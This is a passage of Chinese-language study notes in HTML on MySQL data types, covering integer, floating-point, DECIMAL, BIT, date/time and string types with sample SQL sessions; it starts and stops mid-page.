<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">&#x6570;&#x636E;&#x7C7B;&#x578B;</h2>
<h3 id="%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B">&#x6574;&#x6570;&#x7C7B;&#x578B;</h3>
<p>&#x8D85;&#x51FA;&#x8BBE;&#x7F6E;&#x7684;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x8303;&#x56F4;&#xFF1A;<code>Out of range value for column &apos;?&apos; at ...</code>&#x3002;</p>
<table>
<thead>
<tr>
<th>&#x6574;&#x6570;&#x7C7B;&#x578B;</th>
<th>&#x5B57;&#x8282;</th>
<th>&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;</th>
<th>&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4; (UNSIGNED)</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td>1</td>
<td>-128~127</td>
<td>0~255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768~32767</td>
<td>0~65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608~8388607</td>
<td>0~16777215</td>
</tr>
<tr>
<td>INT&#x3001;INTEGER</td>
<td>4</td>
<td>-2147483648~2147483647</td>
<td>0~4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808~9223372036854775807</td>
<td>0~18446744073709551615</td>
</tr>
</tbody>
</table>
<p>MySQL 8.0.17&#xFF1A;&#x6574;&#x6570;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x5C5E;&#x6027;&#xFF1A;</p>
<p>&#x6574;&#x578B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x5728;&#x5B9A;&#x4E49;&#x8868;&#x7ED3;&#x6784;&#x65F6;&#x6307;&#x5B9A;&#x6240;&#x9700;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;&#xFF0C;&#x5219;&#x7CFB;&#x7EDF;&#x4F1A;&#x4E3A;&#x6BCF;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x7684;&#x5BBD;&#x5EA6;&#x503C;&#x3002;</p>
<p>&#x6240;&#x6709;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x53EF;&#x9009;&#x7684; <code>UNSIGNED</code> &#x65E0;&#x7B26;&#x53F7;&#x5C5E;&#x6027;&#xFF1A;</p>
<blockquote>
<p><code>UNSIGNED</code> &#x662F;&#x5728; MySQL &#x4E2D;&#x7528;&#x4F86;&#x8A2D;&#x5B9A;&#x6578;&#x503C;&#x53EA;&#x80FD;&#x662F;&#x6B63;&#x7684;&#x5C6C;&#x6027;&#xFF0C;&#x6BD4;&#x5982; <code>tinyint</code> &#x539F;&#x672C;&#x7684;&#x7BC4;&#x570D;&#x662F; -128~128&#xFF0C;&#x52A0;&#x4E86; <code>UNSIGNED</code> &#x7684;&#x5C6C;&#x6027;&#x5F8C;&#xFF0C;&#x7BC4;&#x570D;&#x5C31;&#x6703;&#x8B8A;&#x6210;&#x5F9E; 0~255 &#x9019;&#x6A23;&#xFF0C;&#x5C0D;&#x65BC;&#x4E00;&#x4E9B;&#x6B04;&#x4F4D;&#x5982;&#x679C;&#x78BA;&#x5B9A;&#x4E0D;&#x6703;&#x6709;&#x8CA0;&#x6578;&#xFF0C;&#x53EF;&#x4EE5;&#x8A2D;&#x5B9A;&#x9019;&#x500B;&#x5C6C;&#x6027;&#x589E;&#x52A0;&#x8CC7;&#x6599;&#x9577;&#x5EA6;&#x3002;</p>
</blockquote>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_int3(f1 INT UNSIGNED);
mysql&gt; desc test_int3;
mysql&gt; INSERT INTO test_int3 VALUES(4294967295);
mysql&gt; INSERT INTO test_int3 VALUES(4294967296);
mysql&gt; SELECT * FROm test_int3;
+------------+
| f1         |
+------------+
| 4294967295 |
+------------+
</code></pre>
<ul>
<li><code>TINYINT</code>&#xFF1A;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x679A;&#x4E3E;&#x6570;&#x636E;&#xFF08;&#x8303;&#x56F4;&#x5F88;&#x5C0F;&#x4E14;&#x56FA;&#x5B9A;&#xFF09;</li>
<li><code>SMALLINT</code>&#xFF1A;&#x7528;&#x4E8E;&#x8F83;&#x5C0F;&#x8303;&#x56F4;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF08;&#x7EDF;&#x8BA1;&#x56FA;&#x5B9A;&#x8D44;&#x4EA7;&#x5E93;&#x5B58;&#x6570;&#x91CF;&#xFF09;</li>
<li><code>MEDIUMINT</code>&#xFF1A;&#x7528;&#x4E8E;&#x8F83;&#x5927;&#x6574;&#x6570;&#x7684;&#x8BA1;&#x7B97;&#xFF08;&#x673A;&#x573A;&#x6BCF;&#x65E5;&#x7684;&#x5BA2;&#x6D41;&#x91CF;&#xFF09;</li>
<li><code>INT&#x3001;INTEGER</code>&#xFF1A;&#x8303;&#x56F4;&#x8DB3;&#x591F;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0D;&#x7528;&#x8003;&#x8651;&#x8D85;&#x9650;&#x95EE;&#x9898;&#xFF08;&#x5546;&#x54C1;&#x7F16;&#x53F7;&#xFF09;</li>
<li><code>BIGINT</code>&#xFF1A;&#x5904;&#x7406;&#x5DE8;&#x5927;&#x7684;&#x6574;&#x6570;&#xFF08;&#x7F51;&#x7AD9;&#x70B9;&#x51FB;&#x91CF;&#x3001;&#x53CC;&#x5341;&#x4E00;&#x7684;&#x4EA4;&#x6613;&#x91CF;&#x3001;&#x4EA7;&#x54C1;&#x6301;&#x4ED3;&#xFF09;</li>
</ul>
<h3 id="%E6%B5%AE%E7%82%B9%E7%B1%BB%E5%9E%8B">&#x6D6E;&#x70B9;&#x7C7B;&#x578B;</h3>
<p>&#x6D6E;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x7684;&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#xFF0C;&#x53EA;&#x76F8;&#x5F53;&#x4E8E;&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x7684;&#x4E00;&#x534A;&#xFF1A;&#x4E0D;&#x8BBA;&#x6709;&#x65E0;&#x7B26;&#x53F7;&#xFF0C;&#x6D6E;&#x70B9;&#x6570;&#x90FD;&#x4F1A;&#x5B58;&#x50A8;&#x8868;&#x793A;&#x7B26;&#x53F7;&#x7684;&#x90E8;&#x5206;&#x3002;&#x56E0;&#x6B64;&#x65E0;&#x7B26;&#x53F7;&#x6570;&#x7684;&#x53D6;&#x503C;&#x8303;&#x56F4;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x6709;&#x7B26;&#x53F7;&#x6570;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x90E8;&#x5206;&#x3002;</p>
<p>&#x6D6E;&#x70B9;&#x7C7B;&#x578B;&#x5355;&#x7CBE;&#x5EA6;&#x503C;&#x4F7F;&#x7528; 4 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x53CC;&#x7CBE;&#x5EA6;&#x503C;&#x4F7F;&#x7528; 8 &#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
<p>&#x81EA; MySQL 8.0.17 &#x5F00;&#x59CB;&#xFF0C;<code>&#x6D6E;&#x70B9;&#x7C7B;&#x578B;(M,D)</code> &#x7684;&#x7528;&#x6CD5;&#x4E0D;&#x518D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#xFF1A;</p>
<p><code>FLOAT(M,D)</code> or <code>DOUBLE(M,D)</code>&#xFF1A;<code>M</code> = &#x6574;&#x6570;&#x4F4D; + &#x5C0F;&#x6570;&#xFF0C;<code>D</code> = &#x5C0F;&#x6570;&#x4F4D;&#x3002;<code>D</code> &lt;= <code>M</code> &lt;= 255&#xFF0C;0 &lt;= <code>D</code> &lt;= 30&#x3002;<code>FLOAT(5,2)</code> &#x53EF;&#x4EE5;&#x663E;&#x793A; -999.99-999.99&#x3002;</p>
<h3 id="%E5%AE%9A%E7%82%B9%E6%95%B0%E7%B1%BB%E5%9E%8B">&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B;</h3>
<p>&#x5B9A;&#x70B9;&#x6570;&#x5728;&#x6570;&#x636E;&#x5E93;&#x5185;&#x90E8;&#x4EE5;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x3002;</p>
<p>&#x5B9A;&#x70B9;&#x6570; <code>DECIMAL(M,D)</code> &#x4E2D; <code>M</code> &#x8868;&#x793A;&#x7CBE;&#x5EA6;&#xFF0C;<code>D</code> &#x8868;&#x793A;&#x6807;&#x5EA6;&#x3002;</p>
<p>&#x9ED8;&#x8BA4; <code>DECIMAL(10,0)</code>&#xFF0C;&#x5F53;&#x7CBE;&#x5EA6;&#x8D85;&#x51FA;&#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x5904;&#x7406;&#x3002;</p>
<p><code>DECIMAL</code> &#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E0D;&#x56FA;&#x5B9A;&#xFF0C;&#x7531; <code>M</code> &#x51B3;&#x5B9A;&#xFF0C;&#x603B;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x662F; <code>M+2</code> &#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
<p>&#x6D6E;&#x70B9;&#x6570;&#x4E0E;&#x5B9A;&#x70B9;&#x6570;&#x7684;&#x533A;&#x522B;&#xFF1A;</p>
<ul>
<li>&#x957F;&#x5EA6;&#x4E00;&#x5B9A;&#x65F6;&#xFF0C;&#x6D6E;&#x70B9;&#x7C7B;&#x578B;&#x7684;&#x53EF;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x66F4;&#x5927;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x7CBE;&#x51C6;</li>
<li>&#x5B9A;&#x70B9;&#x6570;&#x7C7B;&#x578B;&#x7684;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x867D;&#x7136;&#x76F8;&#x5BF9;&#x8F83;&#x5C0F;&#xFF0C;&#x4F46;&#x662F;&#x7CBE;&#x51C6;</li>
</ul>
<h3 id="%E4%BD%8D%E7%B1%BB%E5%9E%8B">&#x4F4D;&#x7C7B;&#x578B;</h3>
<p><code>BIT</code> &#x7C7B;&#x578B;&#x4E2D;&#x5B58;&#x50A8;&#x4E8C;&#x8FDB;&#x5236;&#x503C;&#x3002;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x4F4D;&#x6570; <code>M</code> &#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F; 1 &#x4F4D;&#x3002;</p>
<p>&#x4F4D;&#x6570;&#x6700;&#x5C0F;&#x503C;&#x4E3A; 1&#xFF0C;&#x6700;&#x5927;&#x503C;&#x4E3A; 64&#x3002;</p>
<pre><code class="language-sql">mysql&gt; CREATE TABLE test_bit1(f1 BIT, f2 BIT(5), f3 BIT(64));
mysql&gt; INSERT INTO test_bit1(f1,f2) VALUES (1,23);
mysql&gt; SELECT * FROM test_bit1;
+------------+------------+------------+
| f1         | f2         | f3         |
+------------+------------+------------+
| 0x01       | 0x17       | NULL       |
+------------+------------+------------+
mysql&gt; INSERT INTO test_bit1 (f1) VALUES (2);
ERROR 1406 (22001): Data too long for column &apos;f1&apos; at row 1
</code></pre>
<h3 id="%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E7%B1%BB%E5%9E%8B">&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;</h3>
<table>
<thead>
<tr>
<th style="text-align:center">&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x5B57;&#x8282;</th>
<th style="text-align:center">&#x65E5;&#x671F;&#x683C;&#x5F0F;</th>
<th style="text-align:center">&#x6700;&#x5C0F;&#x503C;</th>
<th style="text-align:center">&#x6700;&#x5927;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">YEAR</td>
<td style="text-align:center">&#x5E74;</td>
<td style="text-align:center">1</td>
<td style="text-align:center">YYYY&#x6216;YY</td>
<td style="text-align:center">1901</td>
<td style="text-align:center">2155</td>
</tr>
<tr>
<td style="text-align:center">TIME</td>
<td style="text-align:center">&#x65F6;&#x95F4;</td>
<td style="text-align:center">3</td>
<td style="text-align:center">HH:MM:SS</td>
<td style="text-align:center">-838:59:59</td>
<td style="text-align:center">838:59:59</td>
</tr>
<tr>
<td style="text-align:center">DATE</td>
<td style="text-align:center">&#x65E5;&#x671F;</td>
<td style="text-align:center">3</td>
<td style="text-align:center">YYYY-MM-DD</td>
<td style="text-align:center">1000-01-01</td>
<td style="text-align:center">9999-12-03</td>
</tr>
<tr>
<td style="text-align:center">DATETIME</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">8</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1000-01-01 00:00:00</td>
<td style="text-align:center">9999-12-31 23:59:59</td>
</tr>
<tr>
<td style="text-align:center">TIMESTAMP</td>
<td style="text-align:center">&#x65E5;&#x671F;&#x65F6;&#x95F4;</td>
<td style="text-align:center">4</td>
<td style="text-align:center">YYYY-MM-DD HH:MM:SS</td>
<td style="text-align:center">1970-01-01 00:00:00 UTC</td>
<td style="text-align:center">2038-01-19 03:14:07UTC</td>
</tr>
</tbody>
</table>
<p><code>YEAR</code> &#x7C7B;&#x578B;&#x8868;&#x793A;&#x5E74;&#x4EFD;&#xFF0C;&#x5B58;&#x50A8;&#x7A7A;&#x95F4; 1 &#x5B57;&#x8282;&#xFF0C;&#x662F;&#x6240;&#x6709;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#x4E2D;&#x5360;&#x7A7A;&#x95F4;&#x6700;&#x5C0F;&#x7684;&#x3002;</p>
<p>4 &#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x6570;&#x5B57;&#x8868;&#x793A;&#x7684; <code>YEAR</code> &#x7C7B;&#x578B;&#xFF0C;&#x6700;&#x5C0F;&#x503C;&#x4E3A; 1901&#xFF0C;&#x6700;&#x5927;&#x503C;&#x4E3A; 2155&#x3002;</p>
<p>2 &#x4F4D;&#x5B57;&#x7B26;&#x4E32;&#x683C;&#x5F0F;&#x8868;&#x793A;&#x7684; <code>YEAR</code> &#x7C7B;&#x578B;&#xFF0C;&#x6700;&#x5C0F;&#x503C;&#x4E3A; 00&#xFF0C;&#x6700;&#x5927;&#x503C;&#x4E3A; 99&#xFF1A;</p>
<ul>
<li>01-69 &#x8868;&#x793A; 2001 &#x5230; 2069</li>
<li>70-99 &#x8868;&#x793A; 1970 &#x5230; 1999</li>
<li>&#x53D6;&#x503C;&#x6574;&#x6570;&#x7684; 0 &#x6216; 00 &#x8868;&#x793A; 0000 &#x5E74;</li>
<li>&#x53D6;&#x503C;&#x662F;&#x65E5;&#x671F;/&#x5B57;&#x7B26;&#x4E32;&#x7684; &apos;0&apos; &#x8868;&#x793A; 2000 &#x5E74;</li>
</ul>
<p><code>YYYY-MM-DD</code> &#x7684; <code>DATE</code> &#x7C7B;&#x578B;&#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x65E0;&#x65F6;&#x95F4;&#x90E8;&#x5206;&#x3002;&#x9700;&#x8981; 3 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;</p>
<p>&#x5728;&#x5411; <code>DATE</code> &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x7684;&#x683C;&#x5F0F;&#x6761;&#x4EF6;&#xFF1A;</p>
<ul>
<li><code>YYYY-MM-DD/YYYYMMDD</code> &#x6700;&#x5C0F;&#x53D6;&#x503C; 1000-01-01&#xFF0C;&#x6700;&#x5927;&#x53D6;&#x503C; 9999-12-03</li>
<li><code>YY-MM-DD/YYMMDD</code> &#x8F6C;&#x5316;&#x65B9;&#x5F0F;&#x540C;&#x4E24;&#x4F4D;&#x7684; <code>YEAR</code></li>
<li><code>CURRENT_DATE()</code> &#x6216; <code>NOW()</code> &#x51FD;&#x6570;&#x4F1A;&#x63D2;&#x5165;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x7684;&#x65E5;&#x671F;</li>
</ul>
<p><code>TIME</code> &#x7C7B;&#x578B;&#x8868;&#x793A;&#x4E0D;&#x5305;&#x542B;&#x65E5;&#x671F;&#x90E8;&#x5206;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x662F;&#x9700;&#x8981; 3 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;</p>
<p>&#x5728;&#x5411; <code>TIME</code> &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x7684;&#x683C;&#x5F0F;&#x6761;&#x4EF6;&#xFF1A;</p>
<ul>
<li>&#x5E26;&#x6709;&#x5192;&#x53F7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;<code>D</code> &#x8868;&#x793A;&#x5929;&#xFF0C;&#x4F1A;&#x88AB;&#x8F6C;&#x5316;&#x4E3A;&#x5C0F;&#x65F6;</li>
<li>&#x4E0D;&#x5E26;&#x6709;&#x5192;&#x53F7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x6570;&#x5B57;&#xFF1A;&#x8F6C;&#x5316;&#x4E3A; <code>HH:MM:SS</code> &#x8FDB;&#x884C;&#x5B58;&#x50A8;</li>
</ul>
<p><code>DATETIME</code> &#x7C7B;&#x578B;&#x7684;&#x683C;&#x5F0F;&#x4E3A; <code>DATE</code> &#x548C; <code>TIME</code> &#x7ED3;&#x5408;&#xFF0C;&#x5373; <code>YYYY-MM-DD HH:MM:SS</code>&#x3002;</p>
<p><code>DATETIME</code> &#x7C7B;&#x578B;&#x9700;&#x8981; 8 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;&#x5728;&#x6240;&#x6709;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#x4E2D;&#x662F;&#x6700;&#x591A;&#x7684;&#x3002;</p>
<p>&#x5728;&#x5411; <code>DATETIME</code> &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x63D2;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x7684;&#x683C;&#x5F0F;&#x6761;&#x4EF6;&#xFF1A;</p>
<ul>
<li><code>YYYY-MM-DD HH:MM:SS</code> &#x6216; <code>YYYYMMDDHHMMSS</code> &#x683C;&#x5F0F;&#x7684;&#x5B57;&#x7B26;&#x4E32;</li>
<li><code>YYYYMMDDHHMMSS</code> &#x683C;&#x5F0F;&#x7684;&#x6570;&#x5B57;</li>
<li><code>YY-MM-DD HH:MM:SS</code> &#x6216; <code>YYMMDDHHMMSS</code> &#x5B57;&#x7B26;&#x4E32;&#xFF1A;&#x5E74;&#x7B26;&#x5408; <code>YEAR</code> &#x89C4;&#x5219;</li>
<li><code>CURRENT_TIMESTAMP()</code>&#x3001;<code>NOW()</code>&#x3001;<code>SYSDATE()</code> &#x51FD;&#x6570;</li>
</ul>
<p><code>TIMESTAMP</code> &#x663E;&#x793A;&#x683C;&#x5F0F;&#x4E0E; <code>DATETIME</code> &#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x53EA;&#x9700;&#x8981; 4 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x3002;</p>
<blockquote>
<p><code>TIMESTAMP</code> has a range of &apos;1970-01-01 00:00:01&apos; UTC to &apos;2038-01-19 03:14:07&apos; UTC. UTC Coordinated Universal Time &#x4E16;&#x754C;&#x534F;&#x8C03;&#x65F6;&#x95F4;&#xFF0C;&#x4E5F;&#x79F0;&#x4F5C;&#x4E16;&#x754C;&#x6807;&#x51C6;&#x65F6;&#x95F4;&#x3002;</p>
</blockquote>
<p><code>TIMESTAMP</code> &#x5B58;&#x50A8;&#x7684;&#x503C;&#x4F1A;&#x8FDB;&#x884C;&#x65F6;&#x533A;&#x8F6C;&#x6362;&#xFF0C;&#x5373;&#x300C;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x300D;&#x548C; UTC &#x65F6;&#x95F4;&#x4E92;&#x76F8;&#x8F6C;&#x6362;&#x3002;</p>
<p><code>TIMESTAMP</code> &#x548C; <code>DATETIME</code> &#x7684;&#x533A;&#x522B;&#xFF1A;</p>
<ul>
<li><code>TIMESTAMP</code> &#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x8F83;&#x5C0F;&#xFF0C;&#x8868;&#x793A;&#x7684;&#x65F6;&#x95F4;&#x8303;&#x56F4;&#x4E5F;&#x8F83;&#x5C0F;&#xFF1B;</li>
<li><code>TIMESTAMP</code> &#x5E95;&#x5C42;&#x9009;&#x62E9;&#x7684;&#x662F;&#x6BEB;&#x79D2;&#x503C;&#x5B58;&#x50A8;&#xFF0C;&#x8868;&#x793A;&#x8DDD; &apos;1970-1-1 0:0:0&apos; &#x7684;&#x65F6;&#x95F4;</li>
<li>&#x5728;&#x6BD4;&#x8F83;&#x5927;&#x5C0F;&#x6216;&#x65E5;&#x671F;&#x8BA1;&#x7B97;&#x65F6;&#xFF0C;<code>TIMESTAMP</code> &#x66F4;&#x65B9;&#x4FBF;&#x3001;&#x66F4;&#x5FEB;&#xFF1B;</li>
<li><code>TIMESTAMP</code> &#x548C;&#x65F6;&#x533A;&#x6709;&#x5173;&#xFF0C;&#x4F1A;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x65F6;&#x533A;&#x4E0D;&#x540C;&#xFF0C;&#x663E;&#x793A;&#x4E0D;&#x540C;&#x7684;&#x7ED3;&#x679C;</li>
<li><code>DATETIME</code> &#x53EA;&#x80FD;&#x53CD;&#x6620;&#x51FA;&#x63D2;&#x5165;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0E;&#x65F6;&#x533A;&#x65E0;&#x5173;</li>
</ul>
<pre><code class="language-sql">mysql&gt; CREATE TABLE temp_time(d1 DATETIME,d2 TIMESTAMP);
mysql&gt; INSERT INTO temp_time VALUES(&apos;2021-4-22 16:18:52&apos;,&apos;2021-4-22 16:18:52&apos;);
mysql&gt; INSERT INTO temp_time VALUES(NOW(),NOW());
mysql&gt; SELECT * FROM temp_time;
# &#x4FEE;&#x6539;&#x5F53;&#x524D;&#x7684;&#x65F6;&#x533A;
SET time_zone = &apos;+9:00&apos;;
mysql&gt; SELECT * FROM temp_time;
</code></pre>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x7528;&#x5F97;&#x6700;&#x591A;&#x7684;&#x65E5;&#x671F;&#x65F6;&#x95F4;&#x7C7B;&#x578B;&#xFF0C;&#x5C31;&#x662F; <code>DATETIME</code>&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5305;&#x62EC;&#x4E86;&#x5B8C;&#x6574;&#x7684;&#x65E5;&#x671F;&#x548C;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E5F;&#x6700;&#x5927;&#xFF0C;&#x4F7F;&#x7528;&#x8D77;&#x6765;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x3002;</p>
<p>&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x6CE8;&#x518C;&#x65F6;&#x95F4;&#x3001;&#x5546;&#x54C1;&#x53D1;&#x5E03;&#x65F6;&#x95F4;&#x7B49;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528; <code>DATETIME</code> &#x5B58;&#x50A8;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6233;&#xFF0C;&#x56E0;&#x4E3A; <code>DATETIME</code> &#x4E0D;&#x4FBF;&#x4E8E;&#x8BA1;&#x7B97;&#x3002;</p>
<pre><code class="language-sql">mysql&gt; SELECT UNIX_TIMESTAMP();
</code></pre>
<h3 id="%E6%96%87%E6%9C%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B">&#x6587;&#x672C;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;</h3>
<p><code>CHAR(M)</code> &#x7C7B;&#x578B;&#x5728;&#x4E0D;&#x6307;&#x5B9A; <code>M</code> &#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F; 1 &#x4E2A;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x3002;</p>
<p><code>CHAR</code> &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#x5728;&#x5B9A;&#x4E49;&#x65F6;&#x6240;&#x58F0;&#x660E;&#x7684;&#x5B57;&#x6BB5;&#x957F;&#x5EA6;&#x5373;&#x4E3A;&#x8BE5;&#x5B57;&#x6BB5;&#x5360;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x5B57;&#x8282;&#x6570;&#x3002;</p>
<p>&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x7684;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x6BD4;&#x58F0;&#x660E;&#x5C0F;&#xFF1A;</p>
<ul>
<li>&#x5B58;&#x50A8;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x53F3;&#x4FA7;&#x586B;&#x5145;&#x7A7A;&#x683C;&#x4EE5;&#x8FBE;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x957F;&#x5EA6;</li>
<li>&#x68C0;&#x7D22;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5176;&#x5B57;&#x6BB5;&#x4F1A;&#x53BB;&#x9664;&#x5C3E;&#x90E8;&#x7A7A;&#x683C;</li>
</ul>
<p><code>VARCHAR(M)</code> &#x5728;&#x5B9A;&#x4E49;&#x65F6;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x957F;&#x5EA6; <code>M</code>&#x3002;</p>
<p><code>VARCHAR</code> &#x5728;&#x4E0D;&#x540C; MySQL &#x7248;&#x672C;&#xFF1A;</p>
<ul>
<li>&#x4F4E;&#x4E8E; 4.0&#xFF1A;<code>varchar(20)</code> &#x6307; 20 &#x4E2A;&#x5B57;&#x8282;&#x3002;&#x53EA;&#x80FD;&#x5B58; 6 &#x4E2A; UTF8 &#x6C49;&#x5B57;</li>
<li>&#x9AD8;&#x4E8E; 5.0&#xFF1A;<code>varchar(20)</code> &#x6307; 20 &#x4E2A;&#x5B57;&#x7B26;&#x3002;</li>
</ul>
<p>&#x5728;&#x68C0;&#x7D22; <code>VARCHAR</code> &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x4FDD;&#x7559;&#x6570;&#x636E;&#x5C3E;&#x90E8;&#x7684;&#x7A7A;&#x683C;&#x3002;<code>VARCHAR</code> &#x7C7B;&#x578B;&#x5B57;&#x6BB5;&#x6240;&#x5360;&#x7528;&#x7684;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x52A0; 1 &#x4E2A;&#x5B57;&#x8282;&#x3002;</p>
<p><code>CHAR</code> &#x548C; <code>VARCHAR</code> &#x7684;&#x9009;&#x62E9;&#xFF1A;</p>
<ul>
<li><code>CHAR</code> &#x9002;&#x5408;&#x5B58;&#x50A8;&#x8F83;&#x77ED;&#x7684;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x6570;&#x636E;&#xFF1A;&#x95E8;&#x6D3E;&#x53F7;&#x7801;&#x3001;uuid</li>
<li><code>VARCHAR</code> &#x5177;&#x6709;&#x52A8;&#x6001;&#x957F;&#x5EA6;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x9002;&#x5408;&#x9891;&#x7E41;&#x6539;&#x52A8;&#x7684;&#x4FE1;&#x606F;</li>
<li>&#x6839;&#x636E;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A;
<ul>
